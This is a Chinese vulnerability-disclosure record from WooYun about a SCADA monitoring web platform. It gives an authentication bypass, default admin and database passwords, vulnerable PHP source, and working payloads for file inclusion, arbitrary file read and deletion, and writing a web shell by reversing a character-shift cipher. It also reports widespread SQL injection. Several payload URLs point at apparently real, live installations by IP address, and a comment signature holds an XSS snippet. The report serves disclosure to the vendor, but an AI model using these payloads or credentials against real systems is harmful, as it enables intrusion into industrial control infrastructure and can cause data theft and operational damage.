{"id": 66786, "wybug_id": "wooyun-2015-0131719", "wybug_title": "某大型SCADA通用系统多处高危漏洞打包(均可无需登录GetShell)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2015-08-07 10:24", "wybug_open_date": "2015-11-05 15:20", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核", "设计不当导致攻击界面扩大", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向公众公开  简要描述： 此系统漏洞较多，文件包含，任意文件删除，任意文件读取，任意文件写入，敏感信息泄露，默认弱口令，通篇sql注入等，均可无需登录GetShell，各类型漏洞打包处理。这里仅做漏洞代码分析，案例简单测试，请勿用于非法用途。 详细说明：  0x001首先来说说为什么均无需登录即可操作这些漏洞1、在/help/php/login.php登录后的操作，因为在判断session后，错误时没有exit2、在首页index.php登录后的操作，压根就没有进行登录验证，直接操作所以以上两种情况即可无需登录操作整个系统的内容了0x002默认弱口令这里在/help/php/login.php和index.php处的登录存在系统默认弱口令\nrootadmin\n数据库存在弱口令：\nytdf000\n这些弱口令在存储和验证时都会通过一个弱加密（偏移5位）函数来处理0x003敏感信息泄露这里后台存在很多敏感信息泄露，都是系统运行的数据信息这里给一处系统配置信息泄露：\n<?php\t@require_once(dirname( __FILE__ ).\"/../../../setting.inc.php\");\t@require_once(dirname( __FILE__ ).\"/../../share/server/func.php\");\t$adminPwd=encrypt($g_adminPassword,false);\t$dbPwd=encrypt($g_dbPassword,false);\t\theader(\"Content-Type: text/xml\"); \tprint(\"<?xml version='1.0' encoding='UTF-8'?>\"); \tprint(\"<items>\"); \tprint(\"<item section='1' type='text' name='productName' value='$g_productName'/>\");\tprint(\"<item section='1' type='select' name='os' value='$g_os' options='windows,unix,linux'/>\");\tprint(\"<item section='1' type='select' name='platform' value='$g_platform' options='df8002,df8900,df8000,df8003,df8003s,df8003i,df8003d,df8003c'/>\");\tprint(\"<item section='1' type='select' name='language' value='$g_language' options='zh-cn,en,es' uiOptionTexts='simplifiedChinese,english,espanish'/>\");\tprint(\"<item section='1' type='text' name='adminUser' value='$g_adminUser'/>\");\tprint(\"<item section='1' type='password' name='adminPassword' value='$adminPwd'/>\");\tprint(\"<item section='1' type='select' name='uiTemplate' value='$g_uiTemplate' options='default' uiOptionTexts='defaultTemplate'/>\");\tprint(\"<item section='1' type='text'   name='alarmVoice' value='$g_alarmVoice'/>\");\t\tprint(\"<item section='1' type='text' name='svgPath' value='$g_svgPath'/>\");\tprint(\"<item section='1' type='text' name='indexSvg' value='$g_indexSvg'/>\");\tprint(\"<item section='1' type='text' name='expiredSeconds' value='$g_expiredSeconds'/>\");\tprint(\"<item section='1' type='select' name='tablePublishMode' value='$g_tablePublishMode' options='htmTable,jpgTable,xlsTable' uiOptionTexts='htmTable,jpgTable,xlsTable'/>\");\tprint(\"<item section='1' type='select' name='tsRenderMode' value='$g_tsRenderMode' options='volt,fixed' uiOptionTexts='byVoltColor,byFixedColor'/>\");\tprint(\"<item section='1' type='select' name='anonymousValid' value='$g_anonymousValid' options='false,true' uiOptionTexts='disableAnonymous,enableAnonymous'/>\");\tprint(\"<item section='1' type='text' name='anonymousIPs' value='$g_anonymousIPs'/>\");\t\tprint(\"<item section='2' type='select' name='dbType' value='$g_dbType' options='oracle,sybase,mysql,mssql,dm'/>\");\tprint(\"<item section='2' type='select' name='dbTableType' value='$g_dbTableType' options='zh-cn,en' uiOptionTexts='chineseTable,englishTable'/>\");\tprint(\"<item section='2' type='select' name='dbCharset' value='$g_dbCharset' options='GBK,UTF-8,ISO-8859-1'/>\");\tprint(\"<item section='2' type='select' name='dbMode' value='$g_dbMode' options='0,1,2,3' uiOptionTexts='net1Db1,net1Db2,net2Db1,net2Db2'/>\");\tprint(\"<item section='2' type='text' name='dbService1' value='$g_dbService1'/>\");\tprint(\"<item section='2' type='text' name='dbService2' value='$g_dbService2'/>\");\tprint(\"<item section='2' type='text' name='dbService1a' value='$g_dbService1a'/>\");\tprint(\"<item section='2' type='text' name='dbService2a' value='$g_dbService2a'/>\");\tprint(\"<item section='2' type='text' name='dbUser' value='$g_dbUser'/>\");\tprint(\"<item section='2' type='password' name='dbPassword' value='$dbPwd'/>\");\tprint(\"<item section='2' type='select' name='rdbCharset' value='$g_rdbCharset' options='GBK,ISO-8859-1'/>\");\tprint(\"</items>\");?>\n这里直接包含了setting.inc.php文件，无需登录直接访问如下链接即可获取系统配置信息：http://124.129.7.215/modules/manage/server/requestWorkMode.phphttp://61.150.109.61:81/modules/manage/server/requestWorkMode.php</code>\n\n0x004任意文件包含，这里存在三处第一处文件包含，文件modules/curve/server/printcurve.php\n<?php$t_core_dir = dirname( __FILE__ ).DIRECTORY_SEPARATOR;@require_once($t_core_dir.\"../../share/server/func.php\");@require_once($t_core_dir.\"../../../config.php\");@require_once($t_core_dir.\"../../../global.php\");@require_once($t_core_dir.\"../../../entry/dfnw_delegate.php\");$action = trim($_GET['action']);include($root_dir.\"template/\".strtolower($templatestyle).\"/curve/\".$action.\".htm\");//include PrintTemplate($action);?>\n这里没有进行登录验证将action参数带入所要包含的文件中，导致文件包含payload：\nhttp://221.214.179.228:5000/modules/curve/server/printcurve.php?action=../../../../../../../../../../../../windows/win.ini%00.htm\n\n\n第二处文件包含，文件modules/event/server/printevent.php\n<?php$t_core_dir = dirname( __FILE__ ).DIRECTORY_SEPARATOR;@require_once($t_core_dir.\"../../share/server/func.php\");@require_once($t_core_dir.\"../../../config.php\");@require_once($t_core_dir.\"../../../global.php\");@require_once($t_core_dir.\"../../../entry/dfnw_delegate.php\");$action = trim($_GET['action']);include($root_dir.\"template/\".strtolower($templatestyle).\"/event/\".$action.\".htm\");?>\n跟第一处文件包含原理一样payload：\nhttp://221.214.179.228:5000/modules/event/server/printevent.php?action=../../../../../../../../../../../../windows/win.ini%00.htm\n第三处文件包含，文件modules/tmr/server/switchControlPanel.php\n<?php@include_once(dirname( __FILE__ ).\"/../../../config.php\");$func=$_REQUEST[\"func\"];@include(dirname( __FILE__ ).\"/../../../template/$g_uiTemplate/tmr/$func.htm\");?>\nfunc参数直接进入include中，导致包含产生payload：\nhttp://221.214.179.228:5000/modules/tmr/server/switchControlPanel.php?func=../../../../../../../../../../../../windows/win.ini%00.htm\n当然这里所要包含的文件可以直接从fckeditor进行上传了0x005任意文件删除第一处文件删除，文件help/php/deleteTheme.php\n<?php\t@session_start();\tif($_SESSION[\"user\"]==\"\") header(\"Location:login.php\");\trequire_once('../dbi/entry.php');\trequire_once('../php/util.inc.php');\trequire_once('../php/setting.inc.php');\tfunction delSelTheme($id,$fileName,$type)\t{\t\t$flag=true;\t\t$msg=\"''+LANGUAGE.MESSAGES.errorOccured+'：<br>'\";\t\t\t\t$db=new DbEntry(false);\t\tif(!doThemeDelete($db,$id,$fileName,$type))\t\t{\t\t\t$flag=false;\t\t\t$msg.=\"+LANGUAGE.MESSAGES.fileDeleteFailed+'?<br>'\";\t\t\t$msg.=\"+LANGUAGE.MESSAGES.dbQueryFailed+'?<br>'\";\t\t\t$msg.=\"+LANGUAGE.MESSAGES.dbUpdateFailed+'?<br>'\";\t\t}\t\t\t\t//从数据库中获取全部数据\t\t$sql=\"select ID,Parent_ID,Depth,Type,Title,File_Name,Keywords,Birthday,Last_Update,Shortcut,Sequence from xopensdb..Theme_Info_Tab order by Depth,Type,Sequence,Title\";\t\t$result=$db->query($sql);\t\tif($result===false)\t\t{\t\t\t$flag=false;\t\t\t$msg.=\"+LANGUAGE.MESSAGES.dbQueryFailed+'?<br>'\";\t\t}\t\telse \t\t{\t\t\t//更新缓存文件\t\t\tif(!updateCacheData($result,\"themeInfo\"))\t\t\t{\t\t\t\t$flag=false;\t\t\t\t$msg.=\"+LANGUAGE.MESSAGES.fileCreateFailed+'?<br>'\";\t\t\t}\t\t}\t\tif($flag) $msg=\"LANGUAGE.MESSAGES.themeDeleteFinished\";\t\treturn $msg;\t}\t\tfunction doThemeDelete($dbHandle,$id,$fileName,$type)\t{\t\t$flag=true;\t\t//删除文件\t\tif(!deleteFile(iconv(\"UTF-8\",$g_dbCharset,\"../userfiles/file/$fileName\"))) $flag=false;\t\t//删除数据库中的记录\t\t$sql=\"delete from xopensdb..Theme_Info_Tab where ID=$id\";\t\tif($dbHandle->update($sql)===false) $flag=false;\t\t\t\t//如果是文件夹\t\tif($type==\"0\")\t\t{\t\t\t//取得文件夹下的所有文件名\t\t\t$sql=\"select ID,File_Name,Type,Parent_ID from xopensdb..Theme_Info_Tab where Parent_ID=$id\";\t\t\t$result=$dbHandle->query($sql);\t\t\tif($result===false) $flag=false;\t\t\telse\t\t\t{\t\t\t\t//删除文件夹下的所有文件\t\t\t\tforeach($result as $rec)\t\t\t\t{\t\t\t\t\tif(!doThemeDelete($dbHandle,$rec[0],$rec[1],$rec[2])) $flag=false;\t\t\t\t}\t\t\t}\t\t}\t\treturn $flag;\t\t\t}\t\t$id=$_GET[\"id\"];\t$fileName=$_GET[\"fileName\"];\t$type=$_GET[\"type\"];\t$msg=delSelTheme($id,$fileName,$type);?>\n可以看到这里登录验证失败后，直接header跳转，并没有exit，所要继续执行参数filename进入函数delseltheme，然后进入doThemeDelete函数，最后进入deleteFile函数，文件util.inc.php\nunction deleteFile($pathFile){\tif(file_exists($pathFile)) unlink($pathFile);\t\t\tif(file_exists($pathFile)) return false;\telse return true;}\n到最后pathfile直接被unlink删除，导致任意文件删除payload：\nhttp://221.214.179.228:5000/help/php/deleteTheme.php?id=1&fileName=root.txt&type=1\nfilename为你要删除的任意文件,这里即可直接删除/help/userfiles/file/root.txt\n\n当然这里的id参数还存在sql注入漏洞，后面再说第二处文件删除在，同样的问题在help/php/modifyTheme.php\n?php\t@session_start();\tif($_SESSION[\"user\"]==\"\") header(\"Location:login.php\");\t\trequire_once('../xajax/xajax.inc.php');\trequire_once('../dbi/entry.php');\trequire_once('../php/util.inc.php');\trequire_once('../php/setting.inc.php');\t$xajax=new xajax();\t$xajax->registerFunction('modSelTheme');\t$xajax->registerFunction('getThemeContent');\t$xajax->processRequest();\techo $xajax->getJavascript('../xajax');\tfunction modSelTheme($id,$pid,$depth,$themeType,$shortcut,$themeTitle,$fileName,$keywords,$themeContent,$birthday,$newFileName,$sequence)\t{\t\tglobal $g_dbCharset;\t\t\t\t$flag=true;\t\t$error=\"''+LANGUAGE.MESSAGES.errorOccured+'：\\n'\";\t\t//删除旧文件\t\t$file=iconv(\"UTF-8\",$g_dbCharset,\"../userfiles/file/$fileName\");\t\tif(file_exists($file)) deleteFile($file);\n同样filename进入deleteFile函数，导致任意文件删除，原理同第一处第三处文件删除在，modules/manage/server/reportTemplates.php文件\nfunction deleteFiles($fileNames,$dir){\tif(!is_dir($dir)) return \"false\";\t\t$flag=\"true\";\tforeach ($fileNames as $name)\t{\t\tif(!unlink(\"$dir/$name\")) $flag=\"false\";\t}\t\treturn $flag;}$oper = trim ( $_POST ['oper'] );$data =  trim ( $_POST ['data'] );$files=iconvArray(\"UTF-8\",$g_rdbCharset,explode(\"|\",$data));header('Content-Type: text/xml');print('<?xml version=\"1.0\" encoding=\"UTF-8\"?>');print('<items>');$uploadDir=getenv(\"RUNHOME\").\"/webtable/upload\";$publishDir=getenv(\"RUNHOME\").\"/webtable/templates\";switch($oper){\tcase \"list\"://生成列表\t\t//上传的临时模板\t\tprint(transDir2XMLItems($uploadDir,\"uploaded\"));\t\t//已发布的正式模板\t\tprint(transDir2XMLItems($publishDir,\"published\"));\t\tbreak;\tcase \"publish\"://发布模板\t\tprint(\"<result>\".moveFiles($files,$uploadDir,$publishDir).\"</result>\");\t\tbreak;\tcase \"cancel\"://撤销已发布的模板\t\tprint(\"<result>\".moveFiles($files,$publishDir,$uploadDir).\"</result>\");\t\tbreak;\tcase \"deluploaded\"://删除由报表机上传的临时模板\t\tprint(\"<result>\".deleteFiles($files,$uploadDir).\"</result>\");\t\tbreak;\tcase \"delpublished\"://删除已发布模板\t\tprint(\"<result>\".deleteFiles($files,$publishDir).\"</result>\");\t\tbreak;\t\t}\n可控变量data进入files变量，然后进入deleteFile函数，最后通过拼接路径进入unlink0x006任意文件读取文件/help/php/modifyTheme.php\n?php\t@session_start();\tif($_SESSION[\"user\"]==\"\") header(\"Location:login.php\");\t\trequire_once('../xajax/xajax.inc.php');\trequire_once('../dbi/entry.php');\trequire_once('../php/util.inc.php');\trequire_once('../php/setting.inc.php');\t$xajax=new xajax();\t$xajax->registerFunction('modSelTheme');\t$xajax->registerFunction('getThemeContent');\t$xajax->processRequest();\techo $xajax->getJavascript('../xajax');        .........        function getThemeContent($fileName)\t{\t\tglobal $g_dbCharset;\t\t$fileName=iconv(\"UTF-8\",$g_dbCharset,$fileName);\t\t$content=readHtmlFile($fileName);\t\t$obj=new xajaxResponse();\t\t$obj->assign(\"contentCache\",\"value\",$content);\t\t$obj->script(\"fillThemeContent();\");\t\treturn $obj;\t}\n同样这里的登录绕过调用了函数getThemeContent，参数filename是我们可控的filename参数进入readHtmlFile函数，文件util.inc.php文件\nunction readHtmlFile($name){\trequire_once(\"setting.inc.php\");\tglobal $g_userFilePath;\t$content=\"\";\t$fHandle=fopen($name,\"r\");\tif($fHandle)\t{\t\t$content=fread($fHandle,filesize($name));\t\t$content=str_replace(\"../../userfiles/\",$g_userFilePath,$content);\t\tfclose($fHandle);\t}\treturn $content;}\n参数name直接被fopen，fread，导致任意文件读取漏洞payload：\nPOST /help/php/modifyTheme.php HTTP/1.1xajax=getThemeContent&xajaxr=1438667657727&xajaxargs[]=setting.inc.php\n这里的xajax参数为要调用的函数，这里为getThemeContentxajaxargs参数为需要读取的filename，这里为当前目录下的文件，可以../读取任意文件0x007任意文件写入GetShell文件/modules/manage/server/updateWorkMode.php\n<?php@include_once(\"../../../core/util/util.inc.php\");@require_once(dirname( __FILE__ ).\"/../../share/server/func.php\");function updateSetting($setting){\t$values=explode(',',$setting);\t$num=count($values);\t$file=\"../../../setting.inc.php\";\t$fHandle=fopen($file,\"w+\");\tif($fHandle)\t{\t\tfwrite($fHandle,\"<?php\\n\");\t\tfor($i=0;$i<$num;$i++)\t\t{\t\t\t$item=explode(\"=\",$values[$i]);\t\t\tif($item[0]==\"adminPassword\" || $item[0]==\"dbPassword\")\t\t\t{\t\t\t\t$item[1]=encrypt($item[1],true);\t\t\t}\t\t\tfwrite($fHandle,\"\t\\$g_\".$item[0].\"=\\\"\".$item[1].\"\\\";\\n\");\t\t\t\t\t\tif($item[0]==\"platform\")\t\t\t{\t\t\t\tif($item[1]==\"df8002\" || $item[1]==\"df8900\")\t\t\t\t{\t\t\t\t\t$fileSelect = \"../../graph/js/ClientProcessor_8900.js\";\t\t\t\t\t$fileInuse =  \"../../graph/js/ClientProcessor.js\";\t\t\t\t\tcopy($fileSelect, $fileInuse);\t\t\t\t}\t\t\t\telse \t\t\t\t{\t\t\t\t\t$fileSelect = \"../../graph/js/ClientProcessor_8003.js\";\t\t\t\t\t$fileInuse =  \"../../graph/js/ClientProcessor.js\";\t\t\t\t\tcopy($fileSelect, $fileInuse);\t\t\t\t}\t\t\t}\t\t}\t\t\t\t\tfwrite($fHandle,\"?>\");\t\tfclose($fHandle);\t\treturn true;\t}\treturn false;}.........$flag=true;if(!updateSetting($_REQUEST['values'])) $flag=false;.......?>\n注意看这里的updateSetting($_REQUEST['values'])从代码中看到，这里的values进入updatesetting函数后，只有item[1]能进入文件中，而去还是经过encrypt函数加密处理的\nfunction encrypt($srcMsg,$flag){\t$dstMsg=\"\";\t$len=strlen($srcMsg);\tfor($i=0;$i<$len;$i++)\t{\t\tif($flag) $dstMsg.=chr(ord($srcMsg[$i])+5);\t\telse $dstMsg.=chr(ord($srcMsg[$i])-5);\t}\treturn $dstMsg;}\n这里只进行了assic码的偏移操作所要我们要写入我们的内容时，这里得先将恶意代码内容的assic码减5后在写入文件即可0x008sql注入漏洞\n这里就不多说了，通篇存在sql操作的地方，只要有可控变量进入都存在sql注入漏洞，这里就不在一一列举了，意义不大，看代码到处都是\n到此为止，此SCADA监控web系统中的漏洞基本上都涉及到了,各个类型都存在多个漏洞这里仅做代码分析，给出payload，部分给出案例测试至于漏洞利用和对此SCADA系统的影响就不在深入了，见漏洞：http://wooyun.org/bugs/wooyun-2010-0131500   漏洞证明：  见详细说明中payload   修复方案：  加强登录验证，全局过滤处理，加强安全意识。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-07 15:18 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-05 10:25 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:104        | 被嘲笑的梦想：很早前，我就有个梦想。哪一...)\t\t \n  又来了！    \n     2015-08-05 10:26 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1134 漏洞数:203        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  卧槽，根本停不下来！！！    \n     2015-08-05 10:31 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:45        )\t\t \n  卧槽，根本停不下来！！！    \n     2015-08-05 10:41 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  卧槽，根本停不下来！！！    \n     2015-08-05 10:44 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:108        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  -------------撸出血-------------------神奇分隔符---------------    \n     2015-08-05 10:53 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  神奇的一撸即将上映，大型3D惊悚探险！    \n     2015-08-05 11:33 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  我就怕是CMS。还好不是……    \n     2015-08-07 15:22 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1072 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  会代码审计的渗透狮 会吓死人的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}